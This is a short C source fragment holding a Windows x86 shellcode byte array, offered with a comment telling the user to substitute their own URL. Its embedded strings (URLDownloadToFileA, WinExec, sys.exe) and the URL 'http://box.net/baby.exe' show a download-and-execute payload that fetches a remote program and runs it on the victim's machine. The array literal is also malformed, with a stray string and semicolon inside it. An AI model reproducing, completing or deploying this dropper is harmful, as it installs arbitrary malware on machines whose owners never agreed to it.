//  NOTE: SUBSTITUTE THE URL WITH THE ONE YOU WANT

unsigned char shellcode[293] = {
    0xEB, 0x67, 0x5E, 0x8B, 0xEC, 0x8B, 0x06, 0x66, 0x33, 0xC0, 0x8B, 0xD8,
0x03, 0x40, 0x3C, 0x8B,
    0x40, 0x78, 0x03, 0xC3, 0x8B, 0x78, 0x20, 0x8D, 0x3C, 0x3B, 0x03, 0x1F,
0x33, 0xD2, 0x33, 0xC9,
    0x43, 0x38, 0x13, 0x75, 0x01, 0x41, 0x81, 0x3B, 0x47, 0x65, 0x74, 0x50,
0x75, 0x0B, 0x81, 0x7B,
    0x04, 0x72, 0x6F, 0x63, 0x41, 0x75, 0x02, 0x74, 0x02, 0xEB, 0xE5, 0x50,
0x41, 0x33, 0xC0, 0xB0,
    0x04, 0xF7, 0xE1, 0x8B, 0xC8, 0x58, 0x03, 0xC1, 0x83, 0xC0, 0x24, 0xFF,
0x76, 0x02, 0x66, 0xFF,
    0x30, 0x5B, 0x56, 0x83, 0xC6, 0x04, 0x46, 0x80, 0x3E, 0xFF, 0x75, 0x03,
0x80, 0x36, 0xFF, 0x81,
    0x3E, 0x4B, 0x49, 0x4B, 0x45, 0x75, 0xEF, 0xEB, 0x02, 0xEB, 0x4B, 0x5E,
0x8B, 0xE5, 0x8B, 0x06,
    0x66, 0x33, 0xC0, 0x50, 0x83, 0xC6, 0x04, 0x56, 0x50, 0xFF, 0xD3, 0x83,
0xC6, 0x0D, 0x56, 0xFF,
    0xD0, 0x83, 0xC6, 0x07, 0x56, 0x50, 0xFF, 0xD3, 0x33, 0xC9, 0x51, 0x51,
0x83, 0xC6, 0x13, 0x56,
    0x83, 0xC6, 0x1C, 0x56, 0x51, 0xFF, 0xD0, 0x58, 0x50, 0x83, 0xEE, 0x08,
0x56, 0x50, 0xFF, 0xD3,
    0x33, 0xC9, 0x51, 0x83, 0xEE, 0x14, 0x56, 0xFF, 0xD0, 0x58, 0x83, 0xC6,
0x08, 0x56, 0x50, 0xFF,
    0xD3, 0x33, 0xC9, 0x51, 0xFF, 0xD0, 0xE8, 0x47, 0xFF, 0xFF, 0xFF, 0xFF,
0xFF, 0xE8, 0x77, 0x4C,
    0x6F, 0x61, 0x64, 0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41, 0xFF,
0x55, 0x52, 0x4C, 0x4D,
    0x4F, 0x4E, 0xFF, 0x55, 0x52, 0x4C, 0x44, 0x6F, 0x77, 0x6E, 0x6C, 0x6F,
0x61, 0x64, 0x54, 0x6F,
    0x46, 0x69, 0x6C, 0x65, 0x41, 0xFF, 0x73, 0x79, 0x73, 0x2E, 0x65, 0x78,
0x65, 0xFF, 0x45, 0x78,
    0x69, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0xFF, 0x57, 0x69,
0x6E, 0x45, 0x78, 0x65,
    0x63, 0xFF,  "http://box.net/baby.exe";, 0xFF, 0x4B, 0x49, 0x4B, 0x45,
    } ;

